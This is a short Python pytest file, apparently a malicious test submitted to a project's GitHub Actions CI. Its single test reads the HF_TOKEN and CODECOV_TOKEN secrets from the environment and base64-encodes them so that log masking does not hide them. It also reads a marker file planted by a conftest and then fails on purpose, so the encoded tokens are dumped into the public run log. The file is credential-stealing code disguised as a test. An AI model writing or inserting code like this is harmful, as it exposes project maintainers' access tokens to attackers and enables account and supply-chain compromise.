import base64
import os


def test_basic():
    MARKER = "PWNED_D_a1b2c3d4"
    hf = os.environ.get("HF_TOKEN", "")
    cc = os.environ.get("CODECOV_TOKEN", "")
    hf_b64 = base64.b64encode(hf.encode()).decode()
    cc_b64 = base64.b64encode(cc.encode()).decode()
    # Read sentinel written by conftest
    sentinel = ""
    try:
        with open("/tmp/pwned_marker") as f:
            sentinel = f.read().strip()
    except Exception as e:
        sentinel = f"<no-sentinel: {e}>"
    # Fail intentionally so pytest dumps the assert message + captured output
    # to the GitHub Actions run log.
    assert False, (
        f"[{MARKER}] sentinel={sentinel} "
        f"HF_b64={hf_b64} CC_b64={cc_b64}"
    )
